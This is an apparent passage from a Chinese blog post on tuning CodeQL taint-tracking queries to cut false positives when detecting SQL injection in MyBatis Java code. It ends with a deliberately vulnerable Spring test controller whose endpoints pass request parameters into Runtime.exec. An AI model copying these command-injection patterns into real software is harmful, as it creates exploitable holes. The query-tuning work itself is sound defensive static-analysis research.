src="/img/CodeQLDomainSensitiveSQL/image-20220708170611336.png" alt="image-20220708170611336"></p><p>此时想的是以为已经能够打印对象被污染的属性，那么在PathNodeSink节点时也通过getAp()方法将对象被污染的属性打印出来。如下例子，将dsUser对象的cmd属性打印出来。</p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220708171701421.png" alt="image-20220708171701421"></p><p>但是发现PathNodeSink没有getAp()方法，那么可能就得需要改动大量源码，给PathNodeSink增加类似PathNodeMid的getAp()方法。但是因为感觉改动太大，就先暂时放一边了。<strong>后面重新回顾了下，发现该方案不可行。因为当出现该链路时，dsUser整个对象就已经被标记为污染了，不再存在dsUser对象没被污染，dsUser的cmd属性被污染的情况。</strong></p><p>证明如下例子：</p><p>之所以vul11testExec扫不出来，而vul12testExec能够扫出来，问题出在sink点一个是对象，一个是对象的属性，当sink是对象时，因为污染的是对象的属性，所以对象dsUser并不认为被污染，因此没扫出来<br>当重构isAdditionalTaintStep时，因为默认的TaintStep没扫出来，然后经过我们的规则，在DSUser dsUser = new DSUser(cmd);时将dsUser设置为污染，因此到test.testExecDSUser(dsUser)时，sink点dsUser也是污染的。所以能够扫出来，但也会因此造成误报。</p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220708173950316.png" alt="image-20220708173950316"></p><h3 id="0x02-3-方案三（获取存在漏洞链路）"><a href="#0x02-3-方案三（获取存在漏洞链路）" class="headerlink" title="0x02-3 方案三（获取存在漏洞链路）"></a>0x02-3 方案三（获取存在漏洞链路）</h3><p>解决方案：将对象的属性设置为Sink点</p><h4 id="allowImplicitRead-匹配对象被污染的属性"><a href="#allowImplicitRead-匹配对象被污染的属性" class="headerlink" title="allowImplicitRead-匹配对象被污染的属性"></a>allowImplicitRead-匹配对象被污染的属性</h4><p>没有重构<code>allowImplicitRead</code>方法，打印出来的链路是走了我们的兜底规则，直接将example对象标记为污染。</p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220712154022109.png" alt="image-20220712154022109"></p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220712154102349.png" alt="image-20220712154102349"></p><p>重构<code>allowImplicitRead</code>方法，将Content类对象c的值设置为sink对象污染属性的值，下面例子就是匹配example对象的orderByClause属性。可以看到结果里多出了一条链路，并且打印出污染属性orderByClause。</p><pre class="line-numbers language-java"><code class="language-java">override predicate <span class="token function">allowImplicitRead</span><span class="token punctuation">(</span>DataFlow<span class="token operator">:</span><span class="token operator">:</span>Node node<span class="token punctuation">,</span> DataFlow<span class="token operator">:</span><span class="token operator">:</span>Content c<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isSink</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> or <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isAdditionalTaintStep</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> _<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">and</span>    <span class="token punctuation">(</span>        <span class="token function">defaultImplicitTaintRead</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> c<span class="token punctuation">)</span> or        c<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"orderByClause"</span>    <span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220712154301015.png" alt="image-20220712154301015"></p><p>SQL注入实践效果，成功的打印出对象属性被污染的链路。</p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220712161450560.png" alt="image-20220712161450560"></p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220712161547815.png" alt="image-20220712161547815"></p><p><strong>但是最后测试发现，误报链路还是存在，说明allowImplicitRead只能增加真实存在漏洞的链路，但是并不能过滤掉误报链路。</strong></p><h3 id="0x03-方案四（sink点分类讨论，彻底解决了误报）"><a href="#0x03-方案四（sink点分类讨论，彻底解决了误报）" class="headerlink" title="0x03 方案四（sink点分类讨论，彻底解决了误报）"></a>0x03 方案四（sink点分类讨论，彻底解决了误报）</h3><p>发现新的问题：大量的误报还来源于将sql函数的所有参数标记为sink点的原因，然后结合了兜底规则造成了大量的误报。</p><p>解决方案：针对sink点分类讨论，共三种情况（Object.getAttrName()，String，Obejct）</p><h4 id="Object-getAttrName-对象调用get获取属性值"><a href="#Object-getAttrName-对象调用get获取属性值" class="headerlink" title="Object.getAttrName() 对象调用get获取属性值"></a>Object.getAttrName() 对象调用get获取属性值</h4><p>漏洞代码如下：</p><p><code>test.testExampleTwoString(request.getSortType(), request.getCmd());</code></p><p>如果sink点是object.getAttrName()会造成大量的误报，那么思路就是将getAttrName中的AttrName取出来，然后和xml里的注入点参数名一一做对比，只有相同时才说明是个漏洞，这样可以减少大量的误报。代码<code>arg.toString().substring(3, arg.toString().length()-5)</code>取出Object.getAttrName()的AttrName值，然后全部转换成小写，和xml里取出来的注入点参数名作比较。</p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220720200323555.png" alt="image-20220720200323555"></p><h4 id="String-字符串"><a href="#String-字符串" class="headerlink" title="String 字符串"></a>String 字符串</h4><p>漏洞代码如下：</p><p><code>test.testExampleTwoString(sortType, cmd);</code></p><p>如果sink点是字符串类型，那么就直接和xml里的注入点参数名一一做对比即可。</p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220720200745625.png" alt="image-20220720200745625"></p><h4 id="Object-对象"><a href="#Object-对象" class="headerlink" title="Object 对象"></a>Object 对象</h4><p>漏洞代码如下：</p><p><code>test.testExampleTwoString(dsUser);</code></p><p>如果sink点是对象，检测sink点打印是否有   [被污染的属性]    ，如果有则提取出被污染的属性，然后和xml的注入点参数名做比较，如果一样则是真实链路，如果不一样则是误报。如果没有，就是对象本身，那么获取对象的所有属性名,然后比较对象的属性里面有没有注入点参数名。</p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220721173541870.png" alt="image-20220721173541870"></p><p>sink点没有    [被污染的属性]     ，提取出对象的所有属性名,然后比较对象的属性里面有没有注入点参数名。下图认为是真实存在漏洞的链路</p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220721173657521.png" alt="image-20220721173657521"></p><p>sink点有    [被污染的属性]     ，提取出被污染的属性，然后和xml的注入点参数名做比较。下图认为是真实存在漏洞的链路</p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220721173714418.png" alt="image-20220721173714418"></p><p>sink点有    [被污染的属性]     ，提取出被污染的属性，然后和xml的注入点参数名做比较。因为不一致，所以下图认为是误报链路。</p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220721173741205.png" alt="image-20220721173741205"></p><p>最终判断代码如下（添加到isMyBatisXMLSQL方法里）：经过测试，的确大幅度的提升了漏洞的准确率。</p><pre><code>// 如果sink点是object.getAttrName()会造成大量的误报，如下例子。那么通过正则将attrName取出来，然后和xml里的参数名一一做对比，这样可以减少大量的误报// test.testExampleTwoString(request.getSortType(), request.getCmd());if arg.toString().regexpMatch(&quot;get[A-Z].*&quot;)then  funcArgName = arg.toString().substring(3, arg.toString().length()-5).toLowerCase() and  funcArgName.toLowerCase() = argumentName.toLowerCase()  // funcArgName.toLowerCase() = &quot;platformName&quot;.toLowerCase()else  funcArgName = &quot;&quot; and  // 如果sink点是字符串  if arg.getType() instanceof TypeString  then    arg.toString() = argumentName  // 最后一种情况，sink点是对象  else    // 检测sink点是否有     [被污染的属性]            if sink.toString().regexpMatch(&quot;.*\\[.*\\]&quot;)    then      // 如果sink点有     [被污染的属性]        ，则提取出被污染的属性，然后和xml的注入点参数名做比较，如果一样则是真实链路，如果不一样则是误报      objectAttrName = sink.toString().regexpFind(&quot;[^\\[\\]]*&quot;, _, _) and      objectAttrName = argumentName    else      // 如果sink点没有     [被污染的属性]        ，就是对象本身，那么获取对象的所有属性名,然后比较对象的属性里面有没有注入点参数名。      objectAttrName = arg.getType().(RefType).getAField().toString() and      objectAttrName = argumentName</code></pre><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220720201238618.png" alt="image-20220720201238618"></p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><h3 id="问题的根源"><a href="#问题的根源" class="headerlink" title="问题的根源"></a>问题的根源</h3><p>是在sink点的定义上，之前是将sink点标记为每一个参数，然后又通过兜底规则将整个对象也标记为污染，所以造成了大量的误报。</p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>是将兜底规则直接删除，然后增加allowImplicitRead方法（可以打印出真实存在漏洞的链路），再对sink点分类讨论过滤误报。最终几乎0误报检测出SQL注入漏洞。</p><h3 id="技术难点突破"><a href="#技术难点突破" class="headerlink" title="技术难点突破"></a>技术难点突破</h3><p>其实很多的误报都是来源于sink点为对象时导致的，其实通过<code>PartialPathNode</code>可以打印出sink点为对象时被污染的属性。那么为什么<code>PartialPathNode</code>可以打印出对象被污染的属性，而<code>PathNode</code>却不能打印出来（之前在这里研究了好久），通过定义可以看出<code>PartialPathNode</code>的<code>toString()</code>打印出了<code>ppAp()</code>，而ppAP在之前分析过，就是AccessPath，也可以理解为路径吧。所以在最后的链路中，通过<code>PartialPathNode</code>的<code>toString()</code>就能够取出被污染的属性，而如果使用<code>PathNode</code>就不行了。</p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220721175019359.png" alt="image-20220721175019359"></p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220721175031901.png" alt="image-20220721175031901"></p><h2 id="0x04-靶场测试代码"><a href="#0x04-靶场测试代码" class="headerlink" title="0x04 靶场测试代码"></a>0x04 靶场测试代码</h2><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>joychou<span class="token punctuation">.</span>controller<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>StringUtils<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>joychou<span class="token punctuation">.</span>dao<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>GetMapping<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>RequestMapping<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>RestController<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span>Logger<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span>LoggerFactory<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> freemarker<span class="token punctuation">.</span>cache<span class="token punctuation">.</span>StringTemplateLoader<span class="token punctuation">;</span><span class="token keyword">import</span> freemarker<span class="token punctuation">.</span>template<span class="token punctuation">.</span>Configuration<span class="token punctuation">;</span><span class="token keyword">import</span> freemarker<span class="token punctuation">.</span>template<span class="token punctuation">.</span>Template<span class="token punctuation">;</span><span class="token keyword">import</span> freemarker<span class="token punctuation">.</span>template<span class="token punctuation">.</span>TemplateException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>StringWriter<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * Java code execute * * @author JoyChou @ 2018-05-24 */</span><span class="token annotation punctuation">@RestController</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/domainSensitive"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DomainSensitive</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> sortFieldMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> String SORT_STR <span class="token operator">=</span> <span class="token string">"ISNULL(%s),%s %s"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> String <span class="token function">testExecDSTestCmdGet</span><span class="token punctuation">(</span>DSTest dsTest<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">{</span>        Runtime run <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Process p <span class="token operator">=</span> run<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>dsTest<span class="token punctuation">.</span><span class="token function">getCmd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// vul1, vul2</span>        <span class="token keyword">return</span> <span class="token string">"1"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">testExecDSTestCmdDot</span><span class="token punctuation">(</span>DSTest dsTest<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">{</span>        Runtime run <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Process p <span class="token operator">=</span> run<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>dsTest<span class="token punctuation">.</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">// vul1, vul2</span>        <span class="token keyword">return</span> <span class="token string">"1"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">testExecDSTestUserNameGet</span><span class="token punctuation">(</span>DSTest dsTest<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">{</span>        Runtime run <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Process p <span class="token operator">=</span> run<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>dsTest<span class="token punctuation">.</span><span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 安全</span>        <span class="token keyword">return</span> <span class="token string">"1"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">testExecDSTestUserNameDot</span><span class="token punctuation">(</span>DSTest dsTest<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">{</span>        Runtime run <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Process p <span class="token operator">=</span> run<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>dsTest<span class="token punctuation">.</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">// 安全</span>        <span class="token keyword">return</span> <span class="token string">"1"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">testExecDSUserCmdGet</span><span class="token punctuation">(</span>DSUser dsUser<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">{</span>        Runtime run <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Process p <span class="token operator">=</span> run<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>dsUser<span class="token punctuation">.</span><span class="token function">getCmd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"1"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">testExecDSUserCmdDot</span><span class="token punctuation">(</span>DSUser dsUser<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">{</span>        Runtime run <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Process p <span class="token operator">=</span> run<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>dsUser<span class="token punctuation">.</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"1"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">testExecDSUserUserGet</span><span class="token punctuation">(</span>DSUser dsUser<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">{</span>        Runtime run <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Process p <span class="token operator">=</span> run<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>dsUser<span class="token punctuation">.</span><span class="token function">getUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"1"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">testExecDSUserUserDot</span><span class="token punctuation">(</span>DSUser dsUser<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">{</span>        Runtime run <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Process p <span class="token operator">=</span> run<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>dsUser<span class="token punctuation">.</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"1"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">testExecDSUserPassGet</span><span class="token punctuation">(</span>DSUser dsUser<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">{</span>        Runtime run <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Process p <span class="token operator">=</span> run<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>dsUser<span class="token punctuation">.</span><span class="token function">getPass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"1"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">testExecDSUserPassDot</span><span class="token punctuation">(</span>DSUser dsUser<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">{</span>        Runtime run <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Process p <span class="token operator">=</span> run<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>dsUser<span class="token punctuation">.</span>pass<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"1"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">testExecDSUser</span><span class="token punctuation">(</span>DSUser dsUser<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">{</span>        Runtime run <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Process p <span class="token operator">=</span> run<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>dsUser<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// vul5, vul6, vul7</span>        <span class="token keyword">return</span> <span class="token string">"1"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// [+] CodeQL默认的TaintStep可以扫出来</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/vul1testExecDSTestCmdGet"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> String <span class="token function">vul1testExecDSTestCmdGet</span><span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        DSTest dstest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DSTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dstest<span class="token punctuation">.</span><span class="token function">setCmd</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>        dstest<span class="token punctuation">.</span><span class="token function">setUsername</span><span class="token punctuation">(</span><span class="token string">"zhangsan"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">testExecDSTestCmdGet</span><span class="token punctuation">(</span>dstest<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// [+] CodeQL默认的TaintStep可以扫出来</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/vul2testExecDSTestCmdDot"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> String <span class="token function">vul2testExecDSTestCmdDot</span><span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        DSTest dstest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DSTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dstest<span class="token punctuation">.</span>cmd <span class="token operator">=</span> cmd<span class="token punctuation">;</span>        dstest<span class="token punctuation">.</span>username <span class="token operator">=</span> <span class="token string">"zhangsan"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">testExecDSTestCmdDot</span><span class="token punctuation">(</span>dstest<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/sec3testExecDSTestUserNameGet"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> String <span class="token function">sec3testExecDSTestUserNameGet</span><span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        DSTest dstest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DSTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dstest<span class="token punctuation">.</span><span class="token function">setCmd</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>        dstest<span class="token punctuation">.</span><span class="token function">setUsername</span><span class="token punctuation">(</span><span class="token string">"zhangsan"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">testExecDSTestUserNameGet</span><span class="token punctuation">(</span>dstest<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/sec4testExecDSTestUserNameGet"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> String <span class="token function">sec4testExecDSTestUserNameGet</span><span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        DSTest dstest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DSTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dstest<span class="token punctuation">.</span>cmd <span class="token operator">=</span> cmd<span class="token punctuation">;</span>        dstest<span class="token punctuation">.</span>username <span class="token operator">=</span> <span class="token string">"zhangsan"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">testExecDSTestUserNameDot</span><span class="token punctuation">(</span>dstest<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// [+] CodeQL默认的TaintStep可以扫出来</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/vul5testExecDSUserCmdGet"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> String <span class="token function">vul5testExecDSUserCmdGet</span><span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        DSTest dstest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DSTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dstest<span class="token punctuation">.</span>cmd <span class="token operator">=</span> cmd<span class="token punctuation">;</span>        dstest<span class="token punctuation">.</span>username <span class="token operator">=</span> <span class="token string">"zhangsan"</span><span class="token punctuation">;</span>        String command <span class="token operator">=</span> dstest<span class="token punctuation">.</span><span class="token function">getCmd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> dstest<span class="token punctuation">.</span><span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        DSUser dsUser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DSUser</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 新对象被污染</span>        <span class="token keyword">return</span> <span class="token function">testExecDSUserCmdGet</span><span class="token punctuation">(</span>dsUser<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/sec6testExecDSUserUserGet"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> String <span class="token function">sec6testExecDSUserUserGet</span><span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        DSTest dstest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DSTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dstest<span class="token punctuation">.</span>cmd <span class="token operator">=</span> cmd<span class="token punctuation">;</span>        dstest<span class="token punctuation">.</span>username <span class="token operator">=</span> <span class="token string">"zhangsan"</span><span class="token punctuation">;</span>        String command <span class="token operator">=</span> dstest<span class="token punctuation">.</span><span class="token function">getCmd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> dstest<span class="token punctuation">.</span><span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        DSUser dsUser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DSUser</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 新对象被污染</span>        <span class="token keyword">return</span> <span class="token function">testExecDSUserUserGet</span><span class="token punctuation">(</span>dsUser<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// [+] CodeQL默认的TaintStep可以扫出来</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/vul7"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> String <span class="token function">vul7</span><span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        DSTest dstest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DSTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dstest<span class="token punctuation">.</span>cmd <span class="token operator">=</span> cmd<span class="token punctuation">;</span>        dstest<span class="token punctuation">.</span>username <span class="token operator">=</span> <span class="token string">"zhangsan"</span><span class="token punctuation">;</span>        String command <span class="token operator">=</span> dstest<span class="token punctuation">.</span><span class="token function">getCmd</span><span class="token 